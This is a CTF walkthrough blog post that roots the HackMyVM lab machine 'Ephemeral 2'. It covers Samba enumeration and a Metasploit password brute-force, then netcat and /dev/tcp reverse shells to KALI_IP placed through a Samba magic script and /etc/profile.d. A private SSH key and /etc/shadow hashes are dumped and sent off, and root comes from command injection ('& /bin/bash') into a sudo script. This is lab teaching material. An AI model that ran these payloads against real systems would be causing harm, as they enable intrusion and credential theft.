---
title: 'Ephemeral 2: HackMyVM Walkthrough'
description: "Ephemeral 2 is a medium-level box involving Samba exploitation, reverse shells, and privilege escalation. Key steps include discovering open ports, brute-forcing SMB credentials, exploiting a \"magic script,\" and leveraging cron jobs and writable profile scripts to gain root access.."
date: 2024-08-11T19:20:39-08:00
featured: false 
draft: false
comment: true
toc: true
pinned: false
carousel: false
series:
  - walkthroughs
categories:
tags: [] 
images: [ephemeral-2.jpg]
---

## Introduction

| URL | [https://hackmyvm.eu/machines/machine.php?vm=Ephemeral2](https://hackmyvm.eu/machines/machine.php?vm=Ephemeral2) |
| --- | --- |
| Platform | HackMyVM |
| Difficulty | Medium |


Ephemeral 2 is a medium-level CTF challenge involving multiple steps of exploitation, including Samba server vulnerabilities and a script with improper input validation. The challenge begins with an Nmap scan revealing open ports, followed by directory enumeration using Gobuster. The user discovers Samba users and successfully brute-forces the password for user 'randy' with Metasploit.


Accessing the SMB share, the user finds a configuration that allows a reverse shell to be executed. After establishing a shell, the user leverages a cron job running as another user to escalate privileges. The final step involves placing a reverse shell script in the /etc/profile.d/ folder, which grants root access when the cron job executes.


This walkthrough demonstrates techniques such as service enumeration, brute force attacks, reverse shell execution, and privilege escalation through cron jobs and writable directories.

## Walkthrough

Run initial nmap scan to discover ports 22, 80, 139, and 445 are open:

```shell
└─$ nmap -A -sC -p- 192.168.5.122
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 17:09 UTC
Nmap scan report for 192.168.5.122
Host is up (0.010s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:cc:f1:53:7e:6b:31:2c:10:1e:6d:bc:01:b1:c3:a2 (RSA)
|   256 cd:19:04:a0:d1:8a:8b:3d:3e:17:ee:21:5d:cd:6e:49 (ECDSA)
|_  256 e5:6a:27:39:ed:a8:c9:03:46:f2:a5:8c:87:85:44:9e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-08-11T00:09:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: EPHEMERAL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.03 seconds
```

\
Run `gobuster` to discover the "foodservice" directory; we checked out this directory but didn't find much of value:

```shell
└─$ gobuster dir -u http://192.168.5.122 -e -r -x html,htm,asp,aspx,jsp,php,cgi,txt,xml -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.122
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              htm,asp,aspx,xml,html,php,cgi,txt,jsp
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://192.168.5.122/.html                (Status: 403) [Size: 278]
http://192.168.5.122/.htm                 (Status: 403) [Size: 278]
http://192.168.5.122/index.html           (Status: 200) [Size: 10918]
http://192.168.5.122/javascript           (Status: 403) [Size: 278]
http://192.168.5.122/.html                (Status: 403) [Size: 278]
http://192.168.5.122/.htm                 (Status: 403) [Size: 278]
http://192.168.5.122/server-status        (Status: 403) [Size: 278]
http://192.168.5.122/foodservice          (Status: 200) [Size: 16429]
Progress: 2076430 / 2076440 (100.00%)
===============================================================
Finished
===============================================================
```

\
Run `enum4linux` to discover the shares and users randy and ralph on the samba server:

```shell
└─$ enum4linux -r 192.168.5.122
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Aug 10 17:22:21 2024

===============================( Target Information )===========================
                                                                                                                                                           
Target ........... 192.168.5.122                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

=====================( Getting domain SID for 192.168.5.122 )===================
Domain Name: WORKGROUP                                                                   Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

=======( Users on 192.168.5.122 via RID cycling (RIDS: 500-550,1000-1050) )======
[I] Found new SID:                                                                                                                                         S-1-22-1                                                                                                                                                   [I] Found new SID:                                                                                                                                         S-1-5-32                                                                                                                                                   [I] Found new SID:                                                                                                                                         S-1-5-32                                                                                                                                                   [I] Found new SID:                                                                                                                                         S-1-5-32                                                                                                                                                   [I] Found new SID:                                                                                                                                         S-1-5-32        
                                                                                                                                           [+] Enumerating users using SID S-1-5-21-1796334311-1091253459-1090880117 and logon username '', password ''                                               S-1-5-21-1796334311-1091253459-1090880117-501 EPHEMERAL\nobody (Local User)                                                                                S-1-5-21-1796334311-1091253459-1090880117-513 EPHEMERAL\None (Domain Group)S-1-5-21-1796334311-1091253459-1090880117-1001 EPHEMERAL\randy (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                S-1-22-1-1000 Unix User\randy (Local User)                                                                                                                 S-1-22-1-1001 Unix User\ralph (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                          S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
enum4linux complete on Sat Aug 10 17:22:45 2024
```

\
Open `msfconsole` and use the smb_login module to crack the randy password:

```shell
$ msfconsole
msf6 > use scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.5.122
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/nmap.lst
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER randy
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.168.5.122:445     - 192.168.5.122:445 - Starting SMB login bruteforce
...
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:inlove',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:batista',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:bestfriends',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:marian',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:gerald',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:carebear',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:green',
[-] 192.168.5.122:445     - 192.168.5.122:445 - Failed: '.\randy:daddy1',
[+] 192.168.5.122:445     - 192.168.5.122:445 - Success: '.\randy:pogiako'
[*] 192.168.5.122:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

\
Login to SMB share using randy's password (pogiako):

```shell
└─$ smbclient \\\\192.168.5.122\\SYSADMIN --user=randy
Enter WORKGROUP\randy's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 10 18:13:45 2022
  ..                                  D        0  Sun Apr 10 17:36:23 2022
  reminder.txt                        N      193  Sun Apr 10 17:59:06 2022
  smb.conf                            N     9097  Sat Apr  9 13:32:20 2022
  help.txt                            N     4663  Sun Apr 10 17:59:43 2022

                8704372 blocks of size 1024. 434040 blocks available
```

\
View the contents of the `smb.conf` file (use `get` command to download the file) to discover a magic script is defined in the smb server config:

```shell
[SYSADMIN]

path = /home/randy/smbshare
valid users = randy
browsable = yes
writeable = yes
read only = no
magic script = smbscript.elf
guest ok = no
```

\
In KALI, Create a bash script file named `smbscript.elf` containing the following reverse shell command (replace KALI_IP):

```shell
mknod backpipe p; nc KALI_IP 31337 0<backpipe | /bin/bash 1>backpipe
```

\
Start a netcat listener in KALI to receive the reverse shell:

```shell
nc -nvlp 31337
```

\
Then, in the SMB client, put the smbscript.elf into the SYSADMIN share to launch the reverse shell:

```shell
smb: \> put smbscript.elf 
NT_STATUS_IO_TIMEOUT closing remote file \smbscript.elf
```

\
We now have a working interactive command shell:

```shell
# nc -nvlp 31337
listening on [any] 31337 ...
connect to [192.168.5.10] from (UNKNOWN) [192.168.5.122] 38242
id
uid=1000(randy) gid=1000(randy) groups=1000(randy),133(sambashare)
```

\
View the contents of the system crontab to discover a script that runs as user "ralph" every minute:

```shell
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	ralph	/home/ralph/tools/ssh.sh
```

\
View the contents of the cron script to see that the user ralph is logging into the local system every minute when the cron job runs:

```shell
cat /home/ralph/tools/ssh.sh
#!/bin/bash
/usr/bin/ssh -o "StrictHostKeyChecking no" ralph@localhost -i /home/ralph/.ssh/id_rsa
```

\
Run `Linpeas` and see that we have write access to `/etc/profile.d`

```shell
...randy@ephemeral:/home/randy$ python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
<eleases/latest/download/linpeas.sh', 'linpeas.sh')"

randy@ephemeral:/home/randy$ bash linpeas.sh
...
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                         
total 48                                                                                                                                                  
drwxr-xr-x   2 randy root  4096 Apr  9  2022 .
drwxr-xr-x 132 root  root 12288 Apr 10  2022 ..
-rw-r--r--   1 randy root    97 Apr  9  2022 01-locale-fix.sh
-rw-r--r--   1 randy root   835 Feb 18  2022 apps-bin-path.sh
-rw-r--r--   1 randy root   729 Feb  1  2020 bash_completion.sh
-rw-r--r--   1 randy root  1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 randy root   349 Oct 28  2020 im-config_wayland.sh
-rw-r--r--   1 randy root  1368 Apr  9  2022 vte-2.91.sh
-rw-r--r--   1 randy root   967 Apr  9  2022 vte.csh
-rw-r--r--   1 randy root   954 Mar 26  2020 xdg_dirs_desktop_session.sh
You have write privileges over /etc/profile.d/
You have write privileges over /etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/01-locale-fix.sh
/etc/profile.d/vte.csh
/etc/profile.d/apps-bin-path.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/bash_completion.sh
...
```

\
On your KALI machine use netcat to accept reverse shell

```shell
└─$ nc -nlvp 9999
listening on [any] 9999 ...
```

\
Create another reverse shell script in `/etc/profile.d` folder and wait for the cronjob to work (replace KALI_IP)

```shell
#!/bin/bash
bash -i >& /dev/tcp/KALI_IP/9999 0>&1
```

\
Once the cronjob runs and you get your ralph reverse shell, grab the ssh key:

```shell
ralph@ephemeral:~$ cat /home/ralph/.ssh/id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

\
Now in KALI create a file called ralph-key and paste the key into it. SSH into the system using ralphs SSH key:

```shell
$ chmod 600 ralph-key
$ ssh -i ralph-key ralph@192.168.5.122
```

\
Run sudo -l as ralph to see that user ralph can run a specific python script as root:

```shell
sudo -l
Matching Defaults entries for ralph on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ralph may run the following commands on ephemeral:
    (root) NOPASSWD: /usr/bin/python3 /home/ralph/getfile.py
```

\
Running `sudo /usr/bin/python3 /home/ralph/getfile.p`y seems like the script is uploading files... we can't see the source so we are unsure but the parameters are File Path and IP Address

\
In KALI lets create a python script called file_upload.py to handle POST requests and receive files, copy the code below:

```shell {linenos=false}
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Hello, this is a GET response!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Process the POST data
        response = {
            'status': 'success',
            'received_data': post_data
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

\
Lets run the script

```shell
└─$ python3 file_upload.py
Starting httpd on port 8080...
```

\
Back in our ralph shell (replace KALI_IP with your IP):

```shell
ralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py
File Path: /etc/shadow
IP Address: KALI_IP:8080
```

{{< bs/alert warning >}} {{< markdownify >}} This creates a file on the victim machine called `index.html` confirming the file upload (for some reason the file doesn't actually upload, however it shows the contents of what's supposed to be uploaded).
{{< /markdownify>}} {{< /bs/alert >}}

```shell
ralph@ephemeral:~$ cat index.html
{"status": "success", "received_data": "root:$6$ONBXfYmDyD2.uHR2$b8FgiI/1JXkRDB1noB5b3fObAXL3tbZj8QrUxpbmqcw99A17fIVY.6SZM2TrBY0WT1XY0n1T0ZNlx/XKfQNqh/:19092:0:99999:7:::\ndaemon:*:19046:0:99999:7:::\nbin:*:19046:0:99999:7:::\nsys:*:19046:0:99999:7:::\nsync:*:19046:0:99999:7:::\ngames:*:19046:0:99999:7:::\nman:*:19046:0:99999:7:::\nlp:*:19046:0:99999:7:::\nmail:*:19046:0:99999:7:::\nnews:*:19046:0:99999:7:::\nuucp:*:19046:0:99999:7:::\nproxy:*:19046:0:99999:7:::\nwww-data:*:19046:0:99999:7:::\nbackup:*:19046:0:99999:7:::\nlist:*:19046:0:99999:7:::\nirc:*:19046:0:99999:7:::\ngnats:*:19046:0:99999:7:::\nnobody:*:19046:0:99999:7:::\nsystemd-network:*:19046:0:99999:7:::\nsystemd-resolve:*:19046:0:99999:7:::\nsystemd-timesync:*:19046:0:99999:7:::\nmessagebus:*:19046:0:99999:7:::\nsyslog:*:19046:0:99999:7:::\n_apt:*:19046:0:99999:7:::\ntss:*:19046:0:99999:7:::\nuuidd:*:19046:0:99999:7:::\ntcpdump:*:19046:0:99999:7:::\navahi-autoipd:*:19046:0:99999:7:::\nusbmux:*:19046:0:99999:7:::\nrtkit:*:19046:0:99999:7:::\ndnsmasq:*:19046:0:99999:7:::\ncups-pk-helper:*:19046:0:99999:7:::\nspeech-dispatcher:!:19046:0:99999:7:::\navahi:*:19046:0:99999:7:::\nkernoops:*:19046:0:99999:7:::\nsaned:*:19046:0:99999:7:::\nnm-openvpn:*:19046:0:99999:7:::\nhplip:*:19046:0:99999:7:::\nwhoopsie:*:19046:0:99999:7:::\ncolord:*:19046:0:99999:7:::\ngeoclue:*:19046:0:99999:7:::\npulse:*:19046:0:99999:7:::\ngnome-initial-setup:*:19046:0:99999:7:::\ngdm:*:19046:0:99999:7:::\nsssd:*:19046:0:99999:7:::\nrandy:$6$umc2qGGAsuxy4nTr$KGX0WfHCcQwNONY0MzThp6jhh8Y7iWhBb7IdFxVyutTcQJwQXzEYVXKi1PU5RPtr4SQziby6wOIqzayzBIPre.:19092:0:99999:7:::\nsystemd-coredump:!!:19090::::::\nralph:$6$H19Vgg5dcaicaNfZ$yBNxkgPYn9.sCw.Kiua/zYlNvQbiLP91QHu7REiHeDAyxsaxG4SBcuFkTikMjPab6f7X.13DyllNg9t88uCvp1:19092:0:99999:7:::\nsshd:*:19091:0:99999:7:::\nmysql:!:19092:0:99999:7:::\n"}
```

{{< bs/alert info >}} {{< markdownify >}}Attempted to crack the root user password using rockyou.txt but did not have any luck...
{{< /bs/alert >}} {{< /markdownify >}}

{{< bs/alert dark >}}After more tampering, we discovered that you can send additional command line switches to after the IP address prompt in the script; this led us to try adding an ampersand and /bin/bash after the IP to receive a root shell:
{{< /bs/alert>}}

```shell
ralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py
File path: fakefile
IP address: fakeip & /bin/bash
File fakefile sent to fakeip & /bin/bash
--2024-08-10 20:55:35--  http://fakeip/

BODY data file ‘fakefile’ missing: No such file or directory

root@ephemeral:/home/ralph# id
uid=0(root) gid=0(root) groups=0(root)
```
